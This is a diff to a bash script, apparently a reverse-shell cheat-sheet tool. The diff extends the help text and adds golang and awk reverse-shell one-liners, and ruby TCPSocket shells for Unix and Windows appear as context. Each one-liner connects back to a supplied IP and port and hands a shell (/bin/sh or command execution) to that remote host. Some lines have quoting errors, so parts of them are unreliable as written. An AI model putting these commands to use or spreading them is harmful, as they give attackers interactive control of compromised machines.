@@ -34,12 +34,12 @@ display_help () {
     echo "  -l shell-type The supported reverse shell kind to display syntax"
     echo "  -v version"
     echo "                                                                  "
-    echo -e "Are support the following kinds: \033[1mbash, netcat, java, perl, php, python2, python3, xterm.\033[m"
+    echo -e "Are support the following kinds: \033[1mbash, netcat, java, perl, php, python2, python3, golang, ruby, awk, xterm.\033[m"
     echo "                                                                  "       
     echo -e "\033[1m SYNOPSIS \033[m"
     echo 
     echo -e "  $(basename $0) [ -i ip:port ] [ -l shell-type ]"
-    echo -e "  shell-type -l: bash, netcat|nc, java|jar, perl|pl, php, python|py, xterm"
+    echo -e "  shell-type -l: bash, netcat|nc, java|jar, perl|pl, php, python|py, ruby|rb, golang|go, awk, xterm"
     echo "                                                                  "
 }
 
@@ -116,6 +116,14 @@ display_reverse_shell_cheat () {
                 echo -e "\t\033[1mruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\033[m"
                 echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
                 echo -e "\t\033[1mruby -rsocket -e c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+                ;;
+            golang | go)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [golang]\033[m"
+                echo -e "\t\033[1mecho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'\033[m"
+                ;;
+            AWK | awk)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [AWK]\033[m"
+                echo -e "\t\033[1mawk 'BEGIN {s = \"/inet/tcp/0/$IP/$PORT; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
                 ;;
             xterm)
                 echo "xterm"
